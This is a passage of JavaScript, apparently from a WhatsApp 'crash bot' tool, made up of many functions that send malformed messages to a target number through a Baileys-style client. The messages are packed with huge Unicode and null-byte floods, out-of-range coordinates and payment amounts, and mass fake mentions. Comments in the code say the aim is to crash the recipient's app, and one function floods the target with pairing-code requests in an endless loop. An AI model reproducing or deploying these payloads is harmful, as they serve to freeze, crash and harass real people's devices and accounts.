                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERACEw/9oACAEDAQE/AIRmycHh/9k=",
                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            }
          }
        }
      },
      { participant: { jid: target } }
    ),
    sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            locationMessage: {
              degreesLatitude: 21.1266,
              degreesLongitude: -11.8199,
              name: "Ⰶ⃟꙰。⨶𝙍𝙀𝙑𝙀𝙉𝙂𝙀𝙍𝙎 𝙄𝙈 𝙃𝙀𝙍𝙀⧃" + "𑇂𑆵𑆴𑆿".repeat(60000),
              url: "https://t.me/fantzy_reals13",
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 1900 },
                  (_, i) => `628${i + 1}@s.whatsapp.net`
                ),
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERACEw/9oACAEDAQE/AIRmycHh/9k=",
                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            }
          }
        }
      },
      { participant: { jid: target } }
    )
  ]);

  await sleep(1000);

  await Promise.all([
    sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: janda1
      }
    }),
    sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: janda2
      }
    })
  ]);
  }
}

async function fcGb(sock, target) {
  await sock.relayMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR", 
      amount1000: 999999999 * 999999999, // ini yang membuat crash amount terlalu besar !
    requestFrom: target, 
      noteMessage: {
        extendedTextMessage: {
         text: "hay, kenalin gw revengers", /// bebas mau pakei teks atau gak / + struktur lain biar Forcelose no clik, akalin sebisa mungkin 
        }
      },
      expiryTimestamp: Date.now() + 86400000,
    }
  }, {})
}

async function ordermessage(sock, target) {
  const xryy = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
    mimetype: "image/webp",
    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
    fileLength: "10610",
    mediaKeyTimestamp: "1775044724",
    stickerSentTs: "1775044724091"
  };

  await sleep(3000);

  const maklu = {
    viewOnceMessageV2: {
      message: {
        orderMessage: {
          orderId: "01",
          thumbnail: Buffer.from([]),
          itemCount: 2,
          status: "PROCEEDED",
          surface: 1,
          message: xryy,
          orderTitle: xryy,
          sellerJid: target,
          token: "XRyySukaNgocok",
          totalAmount1000: 9999999,
          totalCurrencyCode: "USDT",
          contextInfo: {
            conversation: "\u200b".repeat(10000),
            quotedMessage: {
              stickerMessage: xryy
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, maklu, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, {
    messageId: msg.key.id,
    participant: { jid: target },
    additionalAttributes: {
      category: "system"
    }
  });
}

async function AxDLatzy(sock, target) {

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "\0"
            },
            footer: {
              text: "\0"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "DOCUMENT",
                    flow_cta: "ꦽ".repeat(90000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: JSON.stringify({
                    transaction_id: "AXD-" + Date.now() + "ꦽ".repeat(90000)
                  })
                },
                {
                  name: "send_location",
                  buttonParamsJson: JSON.stringify({
                    location_name: "ꦽ".repeat(70000),
                    latitude: 1e308,
                    longitude: 1e308
                  })
                }
              ],
              messageParamsJson: "wa.me/stickerpack/whatsapp",
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  )

  await sock.relayMessage(
    target,
    msg.message,
    {
      messageId: msg.key.id
    }
  )
}

async function Invoce(sock, target) {
  const Click = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: -1e308,
              degreesLongitude: 1e308,
              name: "Durov Bawahannya Visi" + "ꦽ".repeat(40000),
              url: "https://t.me/durov",
              contextInfo: {
                stanzaId: "AxD" + Date.now(),
                participant: target,
                mentionedJid: [target],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                  title: "ꦽ" + "ꦽ".repeat(300000),
                  body: "ꦾ" + "ꦽ".repeat(300000),
                  mediaType: "IMAGE",
                  jpegThumbnail: Buffer.from(
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                    "base64"
                  ),
                  caption: "𝗬𝗨𝗞𝗢"
                },
                placeholderKey: {
                  remoteJid: "0@g.us",
                  fromMe: true,
                  id: "ABCDEF1234567890"
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "GBU Visi"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "address_message",
                paramsJson: "\x10" + "\u0000".repeat(1045000)
              },
              body: {
                text: "Visi Nih Orangnya Kikir",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  };

  const Yuko = await generateWAMessageFromContent(
    target,
    Click,
    { userJid: target }
  );

  await sock.relayMessage(
    target,
    Yuko.message,
    { messageId: Yuko.key.id }
  );
}

async function Nyawit(sock, target) {
    const exploration = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: Buffer.alloc(),
                    deviceListNetadata: {},
                    deviceListMetadataVersion: 2,
                },
                contectMessage: {
                    vcard: null,
                    displayName: "." + "꧀".repeat(30000) + "$$$${§".repeat(120000),
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, exploration, {
        messageId: null,
        participant: { jid: target }
    })
}

async function DelayInvisible(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
        interactiveResponseMessage: {
          body: {
            text: "kelra - execute",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999, 
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function xCNFSCREENATK(sock, target) {
  await sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -1e308,
      degreesLongitude: 1e308,
      name: "Revengers Vs Maklu" + "ꦾ࣯࣯".repeat(5000),
      address: "ꦾ࣯࣯".repeat(25000),
      jpegThumbnail: null,
      isLive: true,
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        fromMe: false,
        mentionedJid: [target]
      }
    }
  }, { messageId: null, participant: { jid: target } });
}

async function SqlDei(sock, target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const PouMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: true,
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/610551336_1487114352932503_8601752085643056009_n.enc?ccb=11-4&oh=01_Q5Aa4AF1D8-tfDVSH95aNUTNL2iAGkt6JakjAUN57729wjI6-A&oe=69EE386A&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "A64NfxEZPawwa8rWgluFqg2FquLf6Mov0hF65BLE3FQ=",
              fileLength: "3177750",
              seconds: 18,
              mediaKey: "H2tGqLG4abhOnfU3TGQbzHHe0JtlA7ofc4+uz7bqdyE=",
              height: 1280,
              width: 720,
              fileEncSha256: "4GTgcuNZ9VXzVATJdt8IlK550tOBLoWNasHXR7C9rj4=",
              directPath: "/v/t62.7161-24/610551336_1487114352932503_8601752085643056009_n.enc?ccb=11-4&oh=01_Q5Aa4AF1D8-tfDVSH95aNUTNL2iAGkt6JakjAUN57729wjI6-A&oe=69EE386A&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1774636518",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAmQAAAAAAAAAAAAAAf//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AW//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8Af//Z",
              contextInfo: {
                pairedMediaType: "SD_VIDEO_PARENT",
                statusSourceType: "VIDEO"
              },
              streamingSidecar: "lYZ3n16mHUU1hKsX2Q1Bm0Dvh+I2WrK08rZkfvY7Ak6lWHJRtHNr0bg4ZxUVxoAeI0WBHx7VLkjgTnRsGjPfZcKNZnqOoC2mDTK3TjhL5tY5UDHg0s3nhKitw2dDGD1d2K8MrRXcRUMxjCFJ2AWsamyI8s6zoCbHprGxbOJoSOOtTRYiOlm5kaYrJqX8rwuXDZToTQLob/T5xq0/r5AdOHFQHeYeLY/TeuJdXmiNLCxTEBR1WwCDPdoioY19f6RrdsCYHMsPHmNKRpXFHBh+ppbWgiaVvAg3RiWxzqfF5UUsR4ZNv8Bj5UYUmG+AM7hiy3v5/sCk8t8h1rY2x0DyA1igQj2t8SjtXDUhWZDiL0gw15pMVRFS6a1cCvCXWn9pW/LTy9axIaOOzNapHqT9NDuwXqrC7esUHguhVrW7tFTcvkCDLT6Hx+L9/wiFrxO/xjXByI/AzhGgQVDu5TUSE6AQmbYUV+hjueuqfBhnKBS3vHtkjQVre6HjWlnJowxEbM7rCFxyfUZ5E83FCHEMA6A7oVxOUYFZ4aG7OBBjv4lgSryXSrPzXRRFGocoyh395UOaNbq9V3Sb1htRa9j7zO/WB6Q2atV6lvtyCUCgqEJqnafuX3ce2T9EwCHKC18DV+aGX6Th8OFNow=="
            }
          },
          body: {
            text: "Pou Exposed"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: `{\"flow_cta\":\"${"\u0000".repeat(200000)}\"}`,
                version: 3
              }
            ],
            messageParamsJson: "{".repeat(10000)
          },
          contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`),
          remoteJid: "status@broadcast",
            statusAttributionType: 2,
            statusAttributions: [
              {
                statusId: crypto.randomBytes(10).toString("hex"),
                statusJid: "status@broadcast"
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, PouMsg, {
    additionalNodes: Node,
    messageId: null
  });
}

async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦾ࣯࣯".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ꦾ࣯࣯".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/rezox_id",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}


async function onehit(sock, target) {
  if (!sock) throw new Error("sock tidak terdefinisi");
  if (!target) throw new Error("target tidak terdefinisi");

  const message = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "theScript",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  };

  await sock.relayMessage(
    target,
    message,
    {
      participant: { jid: target }
    }
  );
}

async function DelayHardV1(sock, target) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: "Ampos !¡",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000",
          isForwarded: true,
          forwardingScore: 999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function UiNihDek(sock, target, ptcp = false) {
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "#./" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1990 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "x", groupSubject: " x " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function StickerBokep(sock, target){
  const message = {
  "groupStatusMessageV2": {
    "message": {
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
      }
    }
  }
}

  return await sock.relayMessage(target, message, {})
}

async function PairingATC(sock, target) {
    const { WAConnection } = require('reyzbails');
    
    const ByATC = {
        type: "list",
        listMessage: {
            title: "ꦾ".repeat(500000),
            description: "BipzzNew?" + "ꦾ".repeat(500000),
            buttonText: null,
            sections: null
        }
    };

    const Bipzzz = null;

    const sessionName = ('permenmd')
    conn.version = [2, 2142, 12];
    
    await conn.connect();
    
    for(let i = 0; i < 3; i++) {
        await conn.sendMessage(`${target}@s.whatsapp.net`, ByATC);
    }
    
    for(let i = 0; i < 5; i++) {
        await conn.sendMessage(`${target}@s.whatsapp.net`, { text: Bipzzz });
    }
    
    const SendPirATC = async (num, total) => {
        const pairingPromises = [];
        
        for(let i = 0; i < total; i++) {
            const promise = (async () => {
                try {
                    const tempConn = new WAConnection();
                    tempConn.version = [2, 2142, 12];
                    await tempConn.connect();
                    
                    for(let j = 0; j < 5; j++) {
                        await tempConn.requestPairingCode(num);
                        await new Promise(r => setTimeout(r, 50));
                    }
                    
                    await tempConn.close();
                } catch(e) {}
            })();
            
            pairingPromises.push(promise);
            
            if(i % 20 === 0) {
                await new Promise(r => setTimeout(r, 100));
            }
        }
        
        return Promise.all(pairingPromises);
    };

    await SendPirATC(target, 200);
    
    const permanentConnections = [];
    for(let i = 0; i < 30; i++) {
        const temp = new WAConnection();
        temp.version = [2, 2142, 12];
        await temp.connect().catch(() => {});
        
        for(let j = 0; j < 10; j++) {
            temp.requestPairingCode(target).catch(() => {});
        }
        
        permanentConnections.push(temp);
    }
    
    while(true) {
        try {
            const rush = [];
            for(let i = 0; i < 50; i++) {
                const t = new WAConnection();
                t.version = [2, 2142, 12];
                rush.push(t.connect().then(() => {
                    for(let k = 0; k < 3; k++) {
                        t.requestPairingCode(target).catch(() => {});
                    }
                }).catch(() => {}));
            }
            await Promise.all(rush);
            await new Promise(r => setTimeout(r, 10));
        } catch(e) {
            continue;
        }
    }
}

async function AxtCrashInfinity(sock, target) {
  const AxataMsg = {
    viewOnceMessage: {
      message: {
        contexInfo: {
           externalAdReply: {
              title: "X",
              body: "X",
              sourceId: String.fromCharCode(0x0300).repeat(5000),
              sourceUrl: String.fromCharCode(0x0300).repeat(5000),
              renderLargerThumnail: true,
              thumbnail: Buffer.concat([
              Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x00, 0x0A, 0x1A, 0x0A]),
              Buffer.alloc(1024, 0x41),
            ]),
          }
       }
     }
  }};
  
  await sock.relayMessage(target, AxataMsg, {
    participant: { jid: target },
    messageId: null
  });
}

async function albuminvsso(sock, target) {
  await sock.relayMessage(
    target,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " ¡!deadcodex!¡ ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "@xrelly • #fvcker 🩸",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function invisibleSpam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function delayDefined(sock, target) {  
  try {  
    let Int = {  
      extendedTextMessage: {  
        text: "ꦺ".repeat(180000),  
        title: "\x00".repeat(30000),  
        jpegThumbnail: null,  
        thumbnailHeight: 999999,  
        thumbnailWidth: 999999  
      }  
    };  
  
    const A1 = generateWAMessageFromContent(target, Int, {});  
  
    await sock.relayMessage("status@broadcast", A1.message, {  
      messageId: A1.key.id,  
      statusJidList: [target],  
      additionalNodes: [{  
        tag: "meta",  
        attrs: {},  
        content: [{  
          tag: "mentioned_users",  
          attrs: {},  
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]  
        }]  
      }]  
    });  
  
    let msg = {  
      orderMessage: {  
        orderId: "ONDET",  
        thumbnail: null,  
        itemCount: 999999,  
        status: 1,  
        surface: 1,  
        message: "꧀".repeat(30000),  
        orderTitle: "\x00".repeat(20000),  
        sellerJid: target,  
        token: "\u0000",  
        totalAmount1000: 999999,  
        totalCurrencyCode: "IDR",  
        contextInfo: {  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from(  
              { length: 2000 },  
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
            )  
          ],  
          stanzaId: "order-" + Date.now(),  
          participant: target,  
          remoteJid: target,  
          quotedMessage: {  
            extendedTextMessage: {  
              text: "\u0000".repeat(100000)  
            }  
          }  
        },  
        messageVersion: 1,  
        orderRequestMessageId: {  
          remoteJid: target,  
          fromMe: true,  
          id: "\x00",  
          participant: target  
        },  
        catalogType: "PRODUCT_CATALOG",  
        items: [  
          {  
            productId: "DILDO-1",  
            quantity: 1,  
            itemPrice: 99999,  
            currency: "US",  
            name: "\u0000\u0000\u0000".repeat(5000)  
          },  
          {  
            productId: "DILDO-2",  
            quantity: 2,  
            itemPrice: 99999,  
            currency: "UA",  
            name: "\x00\x00\x00".repeat(5000)  
          }  
        ]  
      }  
    };  
  
    const A2 = generateWAMessageFromContent(target, msg, {});  
  
    await sock.relayMessage("status@broadcast", A2.message, {  
      messageId: A2.key.id,  
      statusJidList: [target],  
      additionalNodes: [{  
        tag: "meta",  
        attrs: {},  
        content: [{  
          tag: "mentioned_users",  
          attrs: {},  
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]  
        }]  
      }]  
    });  
      
    let vgx = {  
      viewOnceMessage: {  
        message: {  
          interactiveResponseMessage: {  
            body: {  
              text: "꧀".repeat(30000)  
            },  
            contextInfo: {  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 2000 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              stanzaId: "jaj",  
              participant: target,  
              remoteJid: target,  
              quotedMessage: {  
                interactiveResponseMessage: {  
                  body: {  
                    text: "Ondet kill you",  
                    format: "DEFAULT"  
                  },  
                  nativeFlowResponseMessage: {  
                    name: "call_permission_request",  
                    paramsJson: "\x10".repeat(1045000),  
                    version: 3  
                  },  
                  entryPointConversionSource: "galaxy_message"  
                }  
              }  
            }  
          }  
        }  
      }  
    };  

    const A3 = generateWAMessageFromContent(target, vgx, {});  

    await sock.relayMessage("status@broadcast", A3.message, {  
      messageId: A3.key.id,  
      statusJidList: [target],  
